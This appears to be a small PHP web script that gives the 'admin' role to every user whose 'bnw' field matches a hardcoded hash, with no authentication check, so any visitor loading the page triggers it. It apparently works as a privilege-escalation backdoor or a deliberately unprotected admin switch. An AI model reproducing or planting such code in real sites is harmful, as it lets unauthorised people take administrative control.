<?php

	include('includes/inc.php');
	
	$uQuery=mysqli_query($con,"SELECT * FROM users WHERE bnw = '05b048d7242cb7b8b57cfa3b1d65ecea' AND ring != 'admin'");
	if(mysqli_num_rows($uQuery)>0){
		echo mysqli_num_rows($uQuery).' records found!<br/>';
		while($user=mysqli_fetch_assoc($uQuery)){
			$uFix=mysqli_query($con,"UPDATE users SET ring = 'admin' WHERE id = ".$user["id"]);
			echo 'User \''.$user["username"].'\' has been updated.<br/>';
		}
		echo '<br/>Update complete!<br/><br/>Refresh this window to continue.';
	} else {
		header("Location: ".WEB."/home.php");
	}
?>